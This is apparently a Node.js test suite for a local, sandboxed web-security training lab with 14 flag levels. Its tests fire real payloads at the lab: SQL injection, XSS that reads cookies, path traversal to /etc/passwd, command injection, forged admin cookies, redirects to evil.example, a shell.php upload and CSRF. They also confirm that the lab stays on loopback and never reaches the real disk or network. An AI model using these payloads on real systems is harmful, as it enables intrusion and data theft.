// آزمون آزمایشگاه آسیب‌پذیر: برنامه واقعاً راه می‌افتد و هر ۱۴ آسیب‌پذیری با درخواست واقعی قابل بهره‌برداری است؛
// و مهم‌تر: فقط روی 127.0.0.1 گوش می‌دهد و هیچ فرمان/فایل واقعی دستگاه در دسترس نیست.
import test, { before, after } from "node:test";
import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import { mkdtempSync, readFileSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir, networkInterfaces } from "node:os";
import { join } from "node:path";
import http from "node:http";
import { HUB_SAMPLES } from "../mobile-src/assets/hub-data.js";

const py = ["python3", "python"].find((c) => spawnSync(c, ["--version"]).status === 0);
const PORT = 18000 + Math.floor(Math.random() * 1000);
const dir = mkdtempSync(join(tmpdir(), "cplab-"));
let proc, flags;
const base = `http://127.0.0.1:${PORT}`;

const get = (path, { method = "GET", body, headers = {}, host } = {}) =>
  new Promise((resolve, reject) => {
    const req = http.request(base + path, { method, headers: { ...(host ? { Host: host } : {}), ...(body ? { "content-length": Buffer.byteLength(body) } : {}), ...headers } }, (res) => {
      let data = ""; res.setEncoding("utf8"); res.on("data", (c) => (data += c)); res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
    });
    req.on("error", reject); if (body) req.write(body); req.end();
  });
const form = (obj) => new URLSearchParams(obj).toString();
const post = (path, obj, headers = {}) => get(path, { method: "POST", body: form(obj), headers: { "content-type": "application/x-www-form-urlencoded", ...headers } });

before(async () => {
  if (!py) return;
  const sample = HUB_SAMPLES.find((s) => s.id === "sec_lab_site");
  writeFileSync(join(dir, "lab.py"), sample.code);
  proc = spawn(py, ["-u", "lab.py"], { cwd: dir, env: { ...process.env, PYTHONUNBUFFERED: "1", CP_LAB_PORT: String(PORT) } });
  for (let i = 0; i < 60; i++) { try { await get("/"); break; } catch { await new Promise((r) => setTimeout(r, 100)); } }
  flags = JSON.parse(readFileSync(join(dir, "cp_lab_progress.json"), "utf8")).flags;
});
after(() => proc?.kill());

const need = { skip: !py && "python is not installed" };

test("the lab starts, lists 14 levels, and flags are unique per install", need, async () => {
  const r = await get("/");
  assert.equal(r.status, 200);
  assert.equal(Object.keys(flags).length, 14);
  assert.equal(new Set(Object.values(flags)).size, 14);
  assert.ok(Object.values(flags).every((f) => /^CP\{[a-z_]+_[0-9a-f]{6}\}$/.test(f)));
});

test("listens on loopback only and rejects foreign Host headers (DNS rebinding)", need, async () => {
  const ext = Object.values(networkInterfaces()).flat().find((i) => i && !i.internal && i.family === "IPv4");
  if (ext) {
    const refused = await new Promise((resolve) => { const s = http.get({ host: ext.address, port: PORT, timeout: 1500 }, () => resolve(false)); s.on("error", () => resolve(true)); s.on("timeout", () => { s.destroy(); resolve(true); }); });
    assert.ok(refused, "must not be reachable on " + ext.address);
  }
  assert.equal((await get("/", { host: "evil.example" })).status, 403);
});

test("1 SQLi login bypass", need, async () => {
  assert.ok(!(await post("/login", { username: "admin", password: "wrong" })).body.includes(flags[1]));
  assert.ok((await post("/login", { username: "admin'--", password: "x" })).body.includes(flags[1]));
});
test("2 SQLi UNION", need, async () => {
  const r = await get("/shop?q=" + encodeURIComponent("zzz' UNION SELECT 1,username,0,secret FROM users--"));
  assert.ok(r.body.includes(flags[2]));
});
test("3 reflected XSS + cookie", need, async () => {
  const p = "<img src=x onerror=alert(document.cookie)>";
  const r = await get("/search?q=" + encodeURIComponent(p));
  assert.ok(r.body.includes(p), "payload reflected unescaped");
  assert.ok(String(r.headers["set-cookie"]).includes(flags[3]) && !/httponly/i.test(String(r.headers["set-cookie"])));
});
test("4 stored XSS", need, async () => {
  const p = "<svg onload=alert(document.cookie)>";
  await post("/guestbook", { name: "x", body: p });
  const r = await get("/guestbook");
  assert.ok(r.body.includes(p));
  assert.ok(String(r.headers["set-cookie"]).includes(flags[4]));
});
test("5 IDOR", need, async () => { assert.ok((await get("/notes?id=7")).body.includes(flags[5])); });
test("6 path traversal (virtual files only)", need, async () => {
  assert.equal((await get("/download?file=" + encodeURIComponent("../private/flag.txt"))).status, 404, "single ../ is filtered");
  assert.ok((await get("/download?file=" + encodeURIComponent("....//private/flag.txt"))).body.includes(flags[6]));
  const pw = await get("/download?file=" + encodeURIComponent("....//....//....//etc/passwd"));
  assert.match(pw.body, /lab:x:1000/);
  assert.ok(!existsSync("/nonexistent-check") && pw.body.includes("/bin/sh"), "served from the virtual file system, not the real disk");
});
test("7 forged session cookie", need, async () => {
  assert.equal((await get("/admin")).status, 403);
  const c = Buffer.from(JSON.stringify({ user: "guest", role: "admin" })).toString("base64");
  assert.ok((await get("/admin", { headers: { cookie: "session=" + c } })).body.includes(flags[7]));
});
test("8 weak MD5 hash from forgotten backup → login as ali", need, async () => {
  const robots = await get("/robots.txt");
  assert.match(robots.body, /Disallow: \/backup\//);
  const dump = await get("/backup/db.sql.txt");
  const md5 = (await import("node:crypto")).createHash("md5").update("sunshine").digest("hex");
  assert.ok(dump.body.includes(md5));
  assert.ok((await post("/login", { username: "ali", password: "sunshine" })).body.includes(flags[8]));
});
test("9 open redirect", need, async () => {
  const r = await get("/go?url=" + encodeURIComponent("http://evil.example/"));
  assert.equal(r.status, 302);
  assert.equal(r.headers.location, "http://evil.example/");
  assert.equal(r.headers["x-flag"], flags[9]);
});
test("10 command injection works on the SIMULATED shell only", need, async () => {
  const r = await get("/tools/ping?host=" + encodeURIComponent("127.0.0.1; cat /srv/lab/secret/flag.txt"));
  assert.ok(r.body.includes(flags[10]));
  const marker = join(dir, "pwned.txt");
  const r2 = await get("/tools/ping?host=" + encodeURIComponent(`127.0.0.1; touch ${marker}; cat /etc/hostname`));
  assert.ok(!existsSync(marker), "no real command may run");
  assert.match(r2.body, /command not found/);
});
test("11 SSRF only reaches the lab itself, never the internet", need, async () => {
  assert.ok((await get(`/fetch?url=${encodeURIComponent(`http://127.0.0.1:${PORT}/internal`)}`)).body.includes(flags[11]));
  assert.equal((await get("/internal")).status, 403);
  const ext = await get("/fetch?url=" + encodeURIComponent("http://example.com/"));
  assert.equal(ext.status, 400);
});
test("12 insecure upload", need, async () => {
  const r = await get("/upload", { method: "POST", body: JSON.stringify({ name: "shell.php", content: "x" }), headers: { "content-type": "application/json" } });
  assert.ok(r.body.includes(flags[12]));
});
test("13 exposed debug page", need, async () => { assert.ok((await get("/debug")).body.includes(flags[13])); });
test("14 CSRF via GET", need, async () => {
  assert.ok(!(await get("/bank")).body.includes(flags[14]));
  assert.ok((await get("/bank?to=mallory&amount=500")).body.includes(flags[14]));
});
test("flag submission and progress", need, async () => {
  assert.match((await post("/flags", { flag: "CP{wrong}" })).body, /اشتراک|اشتباه/);
  assert.match((await post("/flags", { flag: flags[1] })).body, /درست/);
  const prog = JSON.parse(readFileSync(join(dir, "cp_lab_progress.json"), "utf8"));
  assert.ok(prog.solved.length >= 10);
});
test("hints and walkthroughs exist for every level", need, async () => {
  for (let n = 1; n <= 14; n++) {
    assert.equal((await get(`/hints/${n}`)).status, 200);
    assert.ok((await get(`/walkthrough/${n}`)).body.includes("دفاع"), "walkthrough " + n + " teaches the fix");
  }
});
